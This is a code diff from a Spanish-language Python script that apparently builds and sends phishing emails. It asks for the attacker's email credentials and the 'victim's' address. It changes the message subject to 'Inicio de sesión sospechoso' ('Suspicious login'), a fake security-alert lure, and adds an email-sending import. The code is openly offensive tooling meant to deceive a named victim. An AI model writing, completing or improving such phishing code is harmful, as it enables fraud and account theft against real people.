@@ -15,8 +15,11 @@ from email.mime.text import MIMEText
 from email import encoders
 from email.mime.base import MIMEBase
 
-def gf():
+from knockknock import email_sender
 
+
+def gf():
+    
     #VARIABLES ESENCIALES
     CHROMEDRIVER_PATH = "chromedriver.exe"
     options = Options()
@@ -46,8 +49,6 @@ def gf():
 
     #PEDIR DATOS
     Username = input("     "+"["+"Username"+"]"+": ")
-
-    Email = input("     "+"["+"Email"+"]"+": ")
 
 
     #SUSTITUCION DE DATOS
@@ -118,12 +119,12 @@ def gf():
 
     try:
         
-        sender_email = input("[*]Introduce tu correo > ")
-        receiver_email = input("[*]Introduce el correo de la victima > ")
-        password = input("[*]Introduce la contraseña de tu email > ")
+        sender_email = input("     "+"["+"Introduce tu correo"+"]"+": ")
+        receiver_email = input("     "+"["+"Introduce el correo de la victima"+"]"+": ")
+        password = input("     "+"["+"Introduce la contraseña de tu email"+"]"+": ")
 
         message = MIMEMultipart("alternative")
-        message["Subject"] = "multipart test"
+        message["Subject"] = "Inicio de sesión sospechoso"
         message["From"] = sender_email
         message["To"] = receiver_email
 
